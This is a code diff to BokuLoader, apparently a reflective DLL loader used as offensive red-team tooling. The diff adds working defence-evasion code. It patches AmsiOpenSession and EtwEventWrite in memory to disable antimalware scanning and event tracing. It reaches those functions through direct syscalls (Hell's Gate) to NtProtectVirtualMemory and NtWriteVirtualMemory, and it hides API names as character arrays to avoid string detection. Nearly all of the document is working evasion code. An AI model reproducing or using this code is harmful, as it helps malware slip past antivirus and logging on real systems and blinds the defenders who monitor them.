@@ -65,8 +65,8 @@ typedef void*  (WINAPI * tGetProcAddress)(void*, char*);
 typedef void*  (WINAPI * DLLMAIN)        (HINSTANCE, unsigned long, void* );
 
 #ifdef BYPASS
-typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
-void  bypass (Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
+typedef void*  (NTAPI  * tNtWrite)       (HANDLE, PVOID, PVOID, unsigned long, PVOID);
+void  bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, DWORD NtProtSyscallNumber, DWORD NtWriteSyscallNumber);
 #endif
 
 __declspec(dllexport) void* WINAPI BokuLoader()
@@ -113,7 +113,10 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
     // AMSI & ETW Optional Bypass
     #ifdef BYPASS
-    bypass(&ntdll, &k32, pLoadLibraryA);
+    char ntstr5[] = {'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
+    tNtWrite pNtWriteVirtualMemory = getSymbolAddress(ntstr5, (void*)20, ntdll.dllBase, ntdll.Export.AddressTable, ntdll.Export.NameTable, ntdll.Export.OrdinalTable);
+    DWORD NtWriteSyscallNumber = getSyscallNumber(pNtWriteVirtualMemory);
+    bypass(&ntdll, &k32, pLoadLibraryA, NtProtSyscallNumber, NtWriteSyscallNumber);
     #endif
 
     // Initial Source Reflective DLL
@@ -480,7 +483,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 }
 
 #ifdef BYPASS
-void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
+void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, DWORD NtProtSyscallNumber, DWORD NtWriteSyscallNumber){
     // ######### AMSI.AmsiOpenSession Bypass
     char as[] = {'a','m','s','i','.','d','l','l',0};
     Dll amsi;
@@ -496,17 +499,37 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA){
     void* pAmsiOpenSession  = getSymbolAddress(aoses, (void*)15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);
 
     SIZE_T bytesWritten;
+    unsigned long oldprotect = 0;
     unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
-    char wpm[] = {'W','r','i','t','e','P','r','o','c'};
-    tWriteProcessMemory pWriteProcessMemory = getSymbolAddress(wpm, (void*)9, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
-    pWriteProcessMemory((void*)-1, pAmsiOpenSession, (void*)amsibypass, sizeof(amsibypass), &bytesWritten);
+    PVOID Base = pAmsiOpenSession;
+    SIZE_T Size = sizeof(amsibypass);
+    // make memory region RWX
+    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+    HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
+    // write the bypass
+    HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
+    HellDescent((HANDLE)-1, pAmsiOpenSession, amsibypass, sizeof(amsibypass), &bytesWritten);
+    // make memory region RX again
+    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+    HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
 
     // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
     char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
     void* pEtwEventWrite  = getSymbolAddress(eew, (void*)13, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
 
     unsigned char etwbypass[] = { 0xc3 }; // ret
-    pWriteProcessMemory((void*)-1, pEtwEventWrite, (void*)etwbypass, sizeof(etwbypass), &bytesWritten);
+    Base = pEtwEventWrite;
+    Size = sizeof(etwbypass);
+    // make memory region RWX
+    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+    HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
+    // write the bypass
+    HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
+    HellDescent((HANDLE)-1, pEtwEventWrite, etwbypass, sizeof(etwbypass), &bytesWritten);
+    // make memory region RX again
+    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+    HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
+
     return;
 }
 #endif
